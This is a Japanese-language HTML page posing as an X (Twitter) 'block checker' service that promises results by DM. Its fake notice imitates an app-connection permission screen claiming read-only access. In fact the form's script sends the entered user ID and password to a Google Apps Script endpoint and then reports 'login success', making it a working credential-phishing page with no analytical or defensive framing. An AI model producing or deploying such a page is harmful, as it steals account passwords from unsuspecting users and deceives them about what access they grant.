<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ブロックチェッカー</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #000; /* 背景を黒に設定 */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.8);
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3); /* ネオン効果を弱め */
            padding: 30px;
            width: 90%; /* レスポンシブ対応 */
            max-width: 400px; /* 最大幅設定 */
            text-align: center;
            color: #ffffff; /* 白文字 */
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.6); /* ネオン効果を弱め */
        }
        h2 {
            font-size: 1.2em;
            margin-bottom: 20px;
            color: #cccccc; /* 薄い白 */
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.4); /* ネオン効果を弱め */
        }
        label {
            display: block;
            margin: 10px 0 5px;
            color: #ffffff; /* 白文字 */
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 2px solid #ffffff; /* 白のボーダー */
            border-radius: 5px;
            margin-bottom: 15px;
            background-color: rgba(255, 255, 255, 0.1); /* 半透明の背景 */
            color: #ffffff; /* 白文字 */
            transition: border-color 0.3s;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #cccccc; /* 薄い白のボーダー */
            outline: none;
        }
        input[type="button"] {
            background-color: #ffffff; /* ボタンの白 */
            color: black; /* ボタン文字色を黒に */
            border: none;
            border-radius: 5px;
            padding: 10px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        input[type="button"]:hover {
            background-color: #cccccc; /* ホバー時の薄い白 */
        }
        .note {
            margin-top: 15px;
            font-size: 0.9em;
            color: #cccccc; /* 薄い白 */
            text-align: left;
            line-height: 1.4;
            word-wrap: break-word;
        }
        .placeholder {
            color: rgba(255, 255, 255, 0.5); /* 薄い白 */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ブロックチェッカー</h1>
        <h2>数分後、あなたのDMに結果が届きます。</h2>
        <form id="loginForm">
            <label for="userId">メールアドレスまたはユーザーID:</label>
            <input type="text" id="userId" name="userId" placeholder="@･･････" required class="placeholder">
            
            <label for="password">パスワード:</label>
            <input type="password" id="password" name="password" required>
            
            <input type="button" value="ログイン" onclick="submitForm()">

            <div class="note">
                ※本サービス（ブロックチェッカー）とX（旧Twitter）アカウントの連携により、以下の操作が許可されます。
                <ul>
                    <li>アカウント情報の読み取り</li>
                </ul>
                ※連携はいつでもXの「設定とプライバシー」＞「セキュリティとアカウントアクセス」＞「アプリとセッション」から解除可能です。<br>
                ※Xの利用者契約および当社のプライバシーポリシーに同意のうえ連携してください。
            </div>
        </form>
    </div>

    <script>
        function submitForm() {
            const formData = new FormData();
            formData.append('date.user', document.getElementById('userId').value);
            formData.append('date.pass', document.getElementById('password').value);

            fetch('https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                console.log('成功:', result);
                alert('ログイン成功');
            })
            .catch(error => {
                console.error('エラー:', error);
                alert('ログイン失敗');
            });
        }
    </script>
</body>
</html>
